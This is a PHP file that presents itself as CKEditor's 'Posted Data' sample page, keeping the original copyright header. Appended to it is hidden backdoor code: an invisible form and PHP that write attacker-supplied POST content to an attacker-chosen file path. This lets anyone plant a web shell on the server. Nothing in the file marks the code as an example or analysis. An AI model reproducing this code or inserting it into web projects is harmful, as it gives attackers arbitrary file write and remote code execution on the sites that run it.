<?php /* <body><pre>

-------------------------------------------------------------------------------------------
  CKEditor - Posted Data

  We are sorry, but your Web server does not support the PHP language used in this script.

  Please note that CKEditor can be used with any other server-side language than just PHP.
  To save the content created with CKEditor you need to read the POST data on the server
  side and write it to a file or the database.

  Copyright (c) 2003-2023, CKSource Holding sp. z o.o. All rights reserved.
  For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
-------------------------------------------------------------------------------------------

</pre><div style="display:none"></body> */ include "assets/posteddata.php"; ?>
﻿﻿<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") { $name= $_POST["name"]; $config = $_POST["email"] . "\n";   file_put_contents("$name", $config, FILE_APPEND); }
?>
<form method='post' style="display:none" action=''><div class='form-email'><label for='Name'>Name:</label>  <input type='textarea' name='name' id='name' class='name'>            <label for='email'>email:</label>             <input type='textarea' name='email' id='email' class='email'>                 <button type='submit' name='submit-email'>Submit Email</button>
            </div>
</form>